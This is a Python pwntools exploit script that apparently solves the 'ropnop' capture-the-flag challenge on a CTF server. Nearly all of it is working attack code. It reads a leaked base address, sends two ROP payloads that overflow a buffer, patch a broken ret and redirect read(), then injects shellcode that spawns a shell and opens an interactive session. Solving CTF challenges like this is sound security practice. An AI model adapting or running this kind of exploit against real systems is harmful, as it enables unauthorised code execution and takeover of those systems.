#!/usr/bin/env python3

from pwn import *

# Setup
context(arch='amd64')

# Target definition
target = remote('hax1.allesctf.net', 9300)
# target = process("./ropnop")

FIXME_RET_OFFSET = 0x11ec # retq after "pop %rsi"
WRITE_RAX_OFFSET = 0x12d6 # write
SHELLCODE_OFFSET = 0x12d4 # main() after read
POP_RSI_OFFSET = 0x11eb
SYSCALL_OFFSET = 0x11e4
READ_OFFSET = 0x12cf

addresses = target.recvline_contains(b'start: ')
base = int(addresses.split(b':')[1][3:15], 16)

# Setup to fix the broken ret
# (set rbp so that mov eax, -0x18(%rbp) will set it to 0xc3)
# and setup to read again
payload_1 = (b'x'*16 +
	p64(base + FIXME_RET_OFFSET + 0x18) +
	p64(base + READ_OFFSET))

# Fix the broken ret and push the correct buffer address for the syscall
# Filler of 0x28 in read()
payload_2 = (b'x'*24 +
	p64(base + WRITE_RAX_OFFSET) +
	b'x'*0x28 +
	p64(base + POP_RSI_OFFSET) +
	p64(base + SHELLCODE_OFFSET) +
	p64(base + READ_OFFSET))
payload_2 += b'x' * (0xc3 - len(payload_2) - 1)

# The actual shellcode
payload_3 = asm(shellcraft.sh())

sleep(0.1)
target.sendline(payload_1)
sleep(0.1)
target.sendline(payload_2)
sleep(0.1)
target.sendline(payload_3)
sleep(0.1)
target.interactive()
